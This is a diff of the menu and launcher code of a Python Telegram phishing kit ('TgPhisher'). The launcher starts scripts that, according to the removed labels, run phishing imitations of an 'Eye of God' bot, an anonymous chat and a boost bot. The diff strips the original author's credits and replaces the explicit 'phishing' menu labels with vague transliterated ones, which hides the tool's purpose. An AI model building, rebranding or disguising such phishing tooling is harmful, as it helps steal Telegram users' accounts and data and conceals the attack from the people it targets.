@@ -22,7 +22,7 @@ def create_sv():
         # Попытка запуска через "python3"
             subprocess.run(["python3", 'sv.py'])
         except Exception:
-            print("     Обе попытки запустить скрипт не удалось.")
+            print("     запустить скрипт не удалось.")
 def create_eyeofgod():
     try:
     # Попытка запуска через "python"
@@ -32,7 +32,7 @@ def create_eyeofgod():
         # Попытка запуска через "python3"
             subprocess.run(["python3", 'eog.py'])
         except Exception:
-            print("     Обе попытки запустить скрипт не удалось.")
+            print("     запустить скрипт не удалось.")
 def create_anonchat():
     try:
     # Попытка запуска через "python"
@@ -42,27 +42,33 @@ def create_anonchat():
         # Попытка запуска через "python3"
             subprocess.run(["python3", 'ac.py'])
         except Exception:
-            print("     Обе попытки запустить скрипт не удалось.")
+            print("     запустить скрипт не удалось.")
 import os
 
 def display_banner():
     os.system('cls' if os.name == 'nt' else 'clear')  # Очистка экрана
 
-    menu = f"""{blue}
-          _______    _____  _     _     _               
-         |__   __|  |  __ \| |   (_)   | |                    
-            | | __ _| |__) | |__  _ ___| |__   ___ _ __   
-            | |/ _` |  ___/| '_ \| / __| '_ \ / _ \ '__|   
-            | | (_| | |    | | | | \__ \ | | |  __/ |        
-            |_|\__, |_|    |_| |_|_|___/_| |_|\___|_|      
-                __/ |                                     
-               |___/   {yellow}Telegram:{reset} t.me/CyberStalker1337              
-                 {yellow}GitHub:{reset} github.com/TheCyberStalker/TgPhisher
+    menu = f"""{red}
+     _____
+< validka >
+ ---------
+    \
+     \
+                                   .::!!!!!!!:.
+  .!!!!!:.                        .:!!!!!!!!!!!!
+  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$
+      :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P
+      $$$$$##WX!:      .<!!!!UW$$$$"  $$$$$$$$#
+      $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$*
+      ^$$$B  $$$$\     $$$$$$$$$$$$   d$$R"
+        "*$bd$$$$      '*$$$$$$$$$$$o+#"
+             """"          """""""
+                                           ddrobil                           
 
-                    {yellow}1{reset} - {cyan}Запуск фишинг Глаз Бога
-                    {yellow}2{reset} - {cyan}Запуск фишинг Анонимного чата
-                    {yellow}3{reset} - {cyan}Запуск фишинг Накрутчик бота
-                    {yellow}0{reset} - {cyan}Выход
+                    {yellow}1{reset} - {cyan}z glaz boga
+                    {yellow}2{reset} - {cyan}z anon chat
+                    {yellow}3{reset} - {cyan}z nakrut
+                    {yellow}0{reset} - {cyan}exxit
 
     """
     print(menu)
